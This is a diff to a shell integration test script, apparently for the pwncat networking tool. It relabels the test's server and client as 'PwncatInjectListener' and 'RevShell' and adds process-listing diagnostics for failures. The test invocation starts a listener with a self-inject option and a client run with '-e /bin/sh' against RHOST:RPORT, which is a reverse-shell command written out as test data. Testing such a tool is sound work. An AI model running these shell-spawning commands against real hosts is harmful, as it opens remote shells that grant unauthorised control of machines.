@@ -60,10 +60,10 @@ run_test() {
 	# --------------------------------------------------------------------------------
 	# START: SERVER
 	# --------------------------------------------------------------------------------
-	print_h2 "(1/9) Start: Server"
+	print_h2 "(1/9) Start: PwncatInjectListener"
 
 	# Start Server
-	print_info "Start Server"
+	print_info "Start PwncatInjectListener"
 	# shellcheck disable=SC2086
 	if ! srv_pid="$( run_bg "" "${PYTHON}" "${BINARY}" ${srv_opts} "${srv_stdout}" "${srv_stderr}" )"; then
 		printf ""
@@ -73,19 +73,19 @@ run_test() {
 	run "sleep ${STARTUP_WAIT}"
 
 	# [SERVER] Ensure Server is running
-	test_case_instance_is_running "Server" "${srv_pid}" "${srv_stdout}" "${srv_stderr}"
+	test_case_instance_is_running "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}"
 
 	# [SERVER] Ensure Server has no errors
-	test_case_instance_has_no_errors "Server" "${srv_pid}" "${srv_stdout}" "${srv_stderr}"
+	test_case_instance_has_no_errors "PwncatInjectListener" "${srv_pid}" "${srv_stdout}" "${srv_stderr}"
 
 
 	# --------------------------------------------------------------------------------
 	# START: CLIENT
 	# --------------------------------------------------------------------------------
-	print_h2 "(2/9) Start: Client"
+	print_h2 "(2/9) Start: RevShell"
 
 	# Start Client
-	print_info "Start Client"
+	print_info "Start RevShell"
 	# shellcheck disable=SC2086
 	if ! cli_pid="$( run_bg "" "${PYTHON}" "${BINARY}" ${cli_opts} "${cli_stdout}" "${cli_stderr}" )"; then
 		printf ""
@@ -109,11 +109,19 @@ run_test() {
 		if [ "${CURR}" -gt "${TRIES}" ]; then
 			kill_pid "${srv_pid}" || true
 			kill_pid "${cli_pid}" || true
-			print_file "SERVER] - [/dev/stderr" "${srv_stderr}"
-			print_file "CLIENT] - [/dev/stderr" "${cli_stderr}"
-			print_file "SERVER] - [/dev/stdout" "${srv_stdout}"
-			print_file "CLIENT] - [/dev/stdout" "${cli_stdout}"
+			print_file "PwncatInjectListener] - [/dev/stderr" "${srv_stderr}"
+			print_file "PwncatInjectListener] - [/dev/stdout" "${srv_stdout}"
+			print_file "RevShell] - [/dev/stderr" "${cli_stderr}"
+			print_file "RevShell] - [/dev/stdout" "${cli_stdout}"
 			print_error "Inject shell is not running"
+			run "ps"
+			run "ps -a" || true
+			run "ps -au" || true
+			run "ps -aux" || true
+			run "ps a" || true
+			run "ps au" || true
+			run "ps aux" || true
+			run "ps -ef" || true
 			exit 1
 		fi
 	done
@@ -191,7 +199,7 @@ run_test() {
 # -------------------------------------------------------------------------------------------------
 
 for curr_round in $(seq "${RUNS}"); do
-	#         server opts            client opts
+	#         PwncatInjectListener opts                                      RevShell opts
 	# BIND ON ANY
 	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "1" "1" "${curr_round}" "${RUNS}"
 done
